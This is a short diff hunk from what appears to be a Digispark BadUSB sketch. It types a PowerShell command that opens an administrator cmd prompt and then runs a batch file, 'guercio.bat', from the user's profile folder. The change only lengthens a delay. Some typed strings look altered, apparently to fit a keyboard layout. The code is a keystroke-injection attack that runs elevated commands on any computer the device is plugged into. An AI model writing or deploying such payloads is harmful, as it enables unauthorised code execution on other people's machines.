@@ -36,7 +36,7 @@ void loop() {
   DigiKeyboard.delay(750);
   DigiKeyboard.print("powershell Start/Process cmd /Verb runAs");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(5000);
+  DigiKeyboard.delay(10000);
   DigiKeyboard.print("%USERPROFILE%`guercio.bat");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   
